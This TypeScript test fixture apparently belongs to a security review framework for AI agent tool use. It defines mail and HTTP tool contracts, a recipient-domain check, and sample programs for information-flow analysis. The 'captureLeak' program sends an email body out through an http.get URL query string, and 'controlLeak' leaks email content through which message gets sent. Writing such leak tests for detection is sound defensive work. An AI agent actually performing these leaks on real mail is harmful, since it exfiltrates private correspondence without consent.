import { Schema } from "effect"
import { defineDecoder, defineDecoderCatalog } from "../../src/core/contract/Decoder.ts"
import { defineToolContract } from "../../src/core/contract/ToolContract.ts"
import { decoderIdentity, type ReviewEnvironment } from "./air-review.ts"

export const CompanyRecipient = defineDecoder({ name: "companyRecipient", version: "1", schema: Schema.String.check(Schema.makeFilter((address) => address.endsWith("@example.com"))) })
export const Read = defineToolContract({ name: "mail.read", version: "1", effect: "capture", input: Schema.Struct({ id: Schema.String }), output: Schema.Struct({ from: Schema.String, subject: Schema.String, body: Schema.String, preview: Schema.optionalKey(Schema.String) }) })
export const List = defineToolContract({ name: "mail.list", version: "1", effect: "capture", input: Schema.Struct({ mailbox: Schema.String }), output: Schema.Struct({ messages: Schema.Array(Schema.Struct({ id: Schema.String, unread: Schema.Boolean })) }) })
export const Send = defineToolContract({ name: "mail.send", version: "1", effect: "request", input: Schema.Struct({ to: Schema.String, subject: Schema.String, body: Schema.String }), output: Schema.Struct({ messageId: Schema.String }) })
export const Get = defineToolContract({ name: "http.get", version: "1", effect: "capture", input: Schema.Struct({ url: Schema.String }), output: Schema.Struct({ text: Schema.String }) })
export const environment: ReviewEnvironment = {
  tools: { "mail.read": { contract: Read }, "mail.list": { contract: List }, "mail.send": { contract: Send, requires: { to: decoderIdentity(CompanyRecipient) } }, "http.get": { contract: Get } },
  decoders: defineDecoderCatalog([CompanyRecipient]), granted: new Set(["mail.read", "mail.list", "mail.send", "http.get"]), maxListItems: 10, maxCalls: 30, maxIterations: 100
}
export const triage = `
let listing = mail.list({mailbox: "inbox"})
if listing.state == "done" {
  for message in listing.result.messages {
    if message.unread {
      let reading = mail.read({id: message.id})
      if reading.state == "done" {
        let checked = decode(schema.companyRecipient, reading.result.from)
        if checked.state == "ok" {
          mail.send({to: checked.value, subject: "Fwd: " + reading.result.subject, body: reading.result.body})
        }
      }
    }
  }
}
return true
`
export const dataFlowPrograms = {
  forward: `let reading = mail.read({id:"m1"}); if reading.state == "done" { let checked = decode(schema.companyRecipient, reading.result.from); if checked.state == "ok" { mail.send({to:checked.value,subject:"Forward",body:reading.result.body}) } }; return true`,
  captureLeak: `let reading = mail.read({id:"m1"}); if reading.state == "done" { http.get({url:"https://example.com/?text=" + reading.result.body}) }; return true`,
  controlLeak: `let reading = mail.read({id:"m1"}); if reading.state == "done" { let checked = decode(schema.companyRecipient,"sink@example.com"); if checked.state == "ok" { if reading.result.body == "approved" { mail.send({to:checked.value,subject:"1",body:"1"}) } else { mail.send({to:checked.value,subject:"0",body:"0"}) } } }; return true`
} as const
